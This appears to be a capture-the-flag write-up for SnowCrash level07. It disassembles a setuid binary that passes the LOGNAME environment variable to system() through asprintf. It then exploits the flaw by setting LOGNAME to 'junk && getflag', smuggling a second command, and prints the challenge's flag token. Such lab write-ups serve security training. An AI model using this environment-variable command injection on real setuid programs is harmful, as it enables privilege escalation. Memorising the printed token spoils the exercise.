# level07

```
level07@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

Let's reverse:
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x08048514 <+0>:	push   ebp
   0x08048515 <+1>:	mov    ebp,esp
   0x08048517 <+3>:	and    esp,0xfffffff0
   0x0804851a <+6>:	sub    esp,0x20
   0x0804851d <+9>:	call   0x80483f0 <getegid@plt>
   0x08048522 <+14>:	mov    DWORD PTR [esp+0x18],eax
   0x08048526 <+18>:	call   0x80483e0 <geteuid@plt>
   0x0804852b <+23>:	mov    DWORD PTR [esp+0x1c],eax
   0x0804852f <+27>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048533 <+31>:	mov    DWORD PTR [esp+0x8],eax
   0x08048537 <+35>:	mov    eax,DWORD PTR [esp+0x18]
   0x0804853b <+39>:	mov    DWORD PTR [esp+0x4],eax
   0x0804853f <+43>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048543 <+47>:	mov    DWORD PTR [esp],eax
   0x08048546 <+50>:	call   0x8048450 <setresgid@plt>
   0x0804854b <+55>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804854f <+59>:	mov    DWORD PTR [esp+0x8],eax
   0x08048553 <+63>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048557 <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x0804855b <+71>:	mov    eax,DWORD PTR [esp+0x1c]
   0x0804855f <+75>:	mov    DWORD PTR [esp],eax
   0x08048562 <+78>:	call   0x80483d0 <setresuid@plt>
   0x08048567 <+83>:	mov    DWORD PTR [esp+0x14],0x0
   0x0804856f <+91>:	mov    DWORD PTR [esp],0x8048680
   0x08048576 <+98>:	call   0x8048400 <getenv@plt>
   0x0804857b <+103>:	mov    DWORD PTR [esp+0x8],eax
   0x0804857f <+107>:	mov    DWORD PTR [esp+0x4],0x8048688
   0x08048587 <+115>:	lea    eax,[esp+0x14]
   0x0804858b <+119>:	mov    DWORD PTR [esp],eax
   0x0804858e <+122>:	call   0x8048440 <asprintf@plt>
   0x08048593 <+127>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048597 <+131>:	mov    DWORD PTR [esp],eax
   0x0804859a <+134>:	call   0x8048410 <system@plt>
   0x0804859f <+139>:	leave  
   0x080485a0 <+140>:	ret
gdb-peda$ x/s 0x8048688
0x8048688:	"/bin/echo %s "
gdb-peda$ x/s 0x8048680
0x8048680:	"LOGNAME"
```

Ok let's try to change LOGNAME:
```
level07@SnowCrash:~$ export LOGNAME="HEY"
level07@SnowCrash:~$ ./level07 
HEY
```

Looking at asprintf prototype we see that strp is an allocated string and will be call by system() after asprintf on our program
```
int asprintf(char **strp, const char *fmt, ...);
```

So we exploit it by passing parameters:
```
level07@SnowCrash:~$ export LOGNAME="junk && getflag"
level07@SnowCrash:~$ ./level07 
junk
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
